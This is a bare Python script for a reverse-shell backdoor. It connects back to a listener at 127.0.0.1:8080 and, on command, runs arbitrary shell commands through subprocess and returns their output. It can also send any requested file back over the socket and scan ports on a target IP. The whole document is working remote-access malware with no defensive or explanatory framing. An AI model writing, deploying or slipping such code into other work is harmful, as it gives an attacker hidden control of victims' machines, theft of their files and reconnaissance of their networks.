import socket
import subprocess
import os

def transfer(s, path):
    
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    
    else:
        s.send('File not found'.encode())

def scanner(s, ip, ports):
    scan_result = '' 
    for port in ports.split(','):
        try: 
            sock =  socket.socket()

            output = sock.connect_ex((ip, int(port)))
            if output == 0:
                scan_result = scan_result + "[+] Port " + port + " is opened" + "\n"
            else:
                scan_result = scan_result + "[-] Port " + port + " is closed"
                sock.close()
        except Exception as e:
            pass
    s.send(scan_result.encode())

def connectback():
    s = socket.socket()
    s.connect(("127.0.0.1", 8080))

    while True:
        command = s.recv(1024)

        if 'exit' in command.decode():
            s.close()
            break
        
        elif 'get' in command.decode():
            grab, path = command.decode().split("-")
            try:
                transfer(s, path)
            except:
                pass
        
        elif 'scan' in command.decode(): 
            command = command[5:].decode() 
            ip, ports = command.split(':')
            scanner(s, ip, ports)
        
        else:
            CMD = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(CMD.stderr.read())
            s.send(CMD.stdout.read())
def main():
    connectback()
main()
